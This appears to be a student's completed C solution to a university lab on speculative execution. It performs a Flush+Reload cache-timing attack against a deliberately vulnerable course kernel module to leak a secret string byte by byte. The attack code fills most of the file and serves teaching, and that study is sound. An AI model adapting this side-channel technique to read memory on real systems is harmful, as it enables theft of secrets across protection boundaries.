/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"
#define CACHE_THRESHOLD 90

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;
    uint64_t junk = 0;

    uint64_t time[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};

    printf("Launching attacker\n");
    //printf("shared memory start: %p\n", shared_memory);
    
    
    //warm-up
    for (int i = 0; i < 100000; i++)
        junk = 2*i + 1;
    
    
    asm volatile("mfence\n\t":::);	
    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
        
        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
            clflush(&shared_memory[LAB2_PAGE_SIZE * i]);

            asm volatile("mfence\n\t":::);	
            call_kernel_part1(kernel_fd, shared_memory, current_offset);
            call_kernel_part1(kernel_fd, shared_memory, current_offset);
            call_kernel_part1(kernel_fd, shared_memory, current_offset);

            time[i] = time_access(&shared_memory[LAB2_PAGE_SIZE * i]);
        }

        asm volatile("mfence\n\t":::);
        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
            if (time[i] < CACHE_THRESHOLD) leaked_byte = i;
        }
        
        /*
        printf("current offset = %ld\n", current_offset);
        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
            printf("time#%d: %ld\n", i, time[i]);
        }
        printf("=====================\n");
        */

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
